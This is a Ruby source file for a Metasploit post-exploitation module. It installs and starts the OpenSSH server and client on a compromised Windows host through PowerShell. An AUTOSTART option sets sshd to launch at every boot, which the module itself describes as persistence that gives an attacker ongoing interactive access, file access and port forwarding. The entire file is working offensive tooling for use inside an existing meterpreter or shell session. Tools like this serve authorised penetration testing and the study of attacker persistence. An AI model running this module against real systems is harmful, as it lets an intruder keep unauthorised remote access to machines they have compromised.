##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::File

  def initialize(info = {})
    super(update_info(info,
                      'Name'          => 'Install OpenSSH for Windows',
                      'Description'   => '
                        This module installs OpenSSH server and client for Windows using PowerShell.
                        SSH on Windows can provide pentesters persistent access to a secure interactive terminal, interactive filesystem access, and port forwarding over SSH.
                      ',
                      'License'       => MSF_LICENSE,
                      'Author'        => ['Michael Long <bluesentinel[at]protonmail.com>'],
                      'Arch' => [ARCH_X86, ARCH_X64],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter', 'shell' ],
                      'References'	=> [
                        ['URL', 'https://docs.microsoft.com/en-us/windows-server/administration/openssh/openssh_overview'],
                        ['URL', 'https://github.com/PowerShell/openssh-portable']
                      ]))
    register_options(
      [
        OptBool.new('INSTALL_SERVER', [true, 'Install OpenSSH.Server for Windows', true]),
        OptBool.new('INSTALL_CLIENT', [true, 'Install OpenSSH.Client for Windows', true]),
        OptBool.new('UNINSTALL_SERVER', [true, 'Uninstall OpenSSH.Server for Windows', false]),
        OptBool.new('UNINSTALL_CLIENT', [true, 'Uninstall OpenSSH.Client for Windows', false]),
        OptString.new('SERVER_VER', [true, 'OpenSSH.Server version', "OpenSSH.Server~~~~0.0.1.0"]),
        OptString.new('CLIENT_VER', [true, 'OpenSSH.Client version', "OpenSSH.Client~~~~0.0.1.0"]),
        OptBool.new('AUTOSTART', [true, 'Sets sshd service to startup automatically at system boot for persistence', true])
      ]
    )
  end

  def run
    # check admin privileges
    unless is_system? || is_admin?
      fail_with(Failure::NotVulnerable, "Insufficient privileges to install or remove OpenSSH")
    end

    # check if PowerShell is available
    psh_path = "\\WindowsPowerShell\\v1.0\\powershell.exe"
    if !file? "%WINDIR%\\System32#{psh_path}"
      fail_with(Failure::NotVulnerable, "No powershell available.")
    end

    # uninstall OpenSSH.Server
    if datastore['UNINSTALL_SERVER']
      print_status("Uninstalling OpenSSH.Server")
      uninstall_ssh_server
    end

    # unintall OpenSSH.Client
    if datastore['UNINSTALL_CLIENT']
      print_status("Uninstalling OpenSSH.Client")
      uninstall_ssh_client
    end

    # install OpenSSH.Server
    if datastore['INSTALL_SERVER']
      print_status("Installing OpenSSH.Server")
      install_ssh_server
    end

    # install OpenSSH.Client
    if datastore['INSTALL_CLIENT']
      print_status("Installing OpenSSH.Client")
      install_ssh_client
    end
  end

  def install_ssh_server
    script = "Add-WindowsCapability -Online -Name #{datastore['SERVER_VER']}; "
    script << "Start-Service sshd; "
    if datastore['AUTOSTART']
      script << "Set-Service -Name sshd -StartupType 'Automatic'"
    end
    script = "-c \"#{script}\""
    cmd_exec("powershell.exe", script, 60)
  end

  def install_ssh_client
    script = "Add-WindowsCapability -Online -Name #{datastore['CLIENT_VER']}; "
    script = "-c \"#{script}\""
    cmd_exec("powershell.exe", script, 60)
  end

  def uninstall_ssh_server
    script = "Stop-Service sshd; "
    script << "Remove-WindowsCapability -Online -Name #{datastore['SERVER_VER']}"
    script = " -c \"#{script}\""
    cmd_exec("powershell.exe", script, 60)
  end

  def uninstall_ssh_client
    script = "Remove-WindowsCapability -Online -Name #{datastore['CLIENT_VER']}"
    script = " -c \"#{script}\""
    cmd_exec("powershell.exe", script, 60)
  end
end
